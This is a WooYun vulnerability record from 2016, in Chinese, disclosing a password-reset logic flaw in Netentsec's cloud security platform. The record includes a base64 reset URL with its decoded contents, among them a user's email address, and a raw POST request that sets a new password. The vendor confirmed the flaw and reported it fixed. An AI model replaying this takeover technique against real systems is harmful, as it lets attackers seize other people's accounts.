{"id": 85858, "wybug_id": "wooyun-2016-0192675", "wybug_title": "网康科技慧眼云安全平台再次秒改任意用户密码(官网帐号演示)", "wybug_corp": "网康科技", "wybug_author": "专业种田", "wybug_date": "2016-04-05 14:53", "wybug_open_date": "2016-04-08 18:25", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-04-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-04-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-04-08：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 我又来了。 详细说明：  这次拿重置功能密码做演示1.通过自己帐号找回密码，收到邮件，打开链接，把用户名改成别人的，提示失败了，看了一下参数中还有邮箱地址，心想是不是用户名与邮箱匹配上才能重置成功，于是找另外一个帐号测试，重置成功。但问题来了，怎么才能同时知道用户名与邮箱呢？找回密码功能中的邮箱地址打码了，这样的话利用难度大了。2.无意中看到找回密码发送成功后的url链接中有一堆加密的信息，于是猜一下是不是base64,解密码之，发现用户名和邮箱地址都在里面，这样就可以重置任意用户密码了。\nhttps://yun.netentsec.com/main/index/pwfind?action=pwfind&params=eyJ1c2VyaWQiOiIxOSIsInVzZXJuYW1lIjoibmV0ZW50c2VjIiwibWFpbCI6ImhhemFyZDA4QDEyNi5jb20iLCJocmVmIjoiaHR0cDpcL1wvbWFpbC4xMjYuY29tIn0=#params base64 解密后：{\"userid\":\"19\",\"username\":\"netentsec\",\"mail\":\"hazard08@126.com\",\"href\":\"http:\\/\\/mail.126.com\"}\n\n\n   漏洞证明：  官网帐号上次提交漏洞后改绑定邮箱了。\nPOST /main/index/setpass HTTP/1.1Host: yun.netentsec.comProxy-Connection: keep-aliveContent-Length: 116Accept: application/json, text/javascript, */*; q=0.01Origin: http://yun.netentsec.comX-Requested-With: XMLHttpRequestUser-Agent:  Content-Type: application/x-www-form-urlencoded; charset=UTF-8Referer: http://yun.netentsec.com/main/index/activation?from=ACTIVE_BY_URL&action=pwfind&t=536df14a6efbf98423076b1b7e16e03cAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8,en;q=0.6Cookie:  username=netentsec&email=hazard08@126.com&pw=a123456&newpw=a123456&XYGQnxJ1kRajx7UI=bbcc55da8094e62cf7f836c09057f7c9\n\n\n   修复方案：  校验 啊校验。   版权声明：转载请注明来源 专业种田@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2016-04-06 18:09 厂商回复： 感谢作者提交！ 最新状态： 2016-04-08：已修复，感谢大家关注！  ", "replys": "漏洞评价：\n评价\n     2016-04-05 14:55 |    \t\t随风的风 \t\t\t( 普通白帽子  |\t\t\t        Rank:238 漏洞数:87        | 微信公众号：233sec  不定期分享各种漏洞思...)\t\t \n  回来就好。。你媳妇我还是继续帮你照顾吧    \n     2016-04-05 14:59 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:248 漏洞数:82        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  大写的牛逼    \n     2016-04-05 15:20 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  大写的NIUBI    \n     2016-04-05 15:24 |    \t\tfeng  \t\t\t( 普通白帽子  |\t\t\t        Rank:750 漏洞数:89        | 想刷个6D)\t\t \n  打雷要下雨    \n     2016-04-05 16:33 |    \t\tPgHook \t\t\t( 普通白帽子  |\t\t\t        Rank:1020 漏洞数:123        | ...........................................)\t\t \n  牛逼    \n     2016-04-05 21:25 |    \t\t坏男孩-A_A \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:23        | 膜拜学习中)\t\t \n  ...........不知道是不是一样= =    \n     2016-04-05 22:22 |    \t\t专业种田  \t\t\t( 核心白帽子 |\t\t\t        Rank:1627 漏洞数:205        | 没有最专业的农民,只有更努力地耕耘..........)\t\t \n  @坏男孩-A_A 类似，不同点，有些技巧。    \n     2016-04-08 18:51 |    \t\t欧尼酱 \t\t\t( 路人 |\t\t\t        Rank:7 漏洞数:4        | 这个能改吧)\t\t \n  大写的666    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}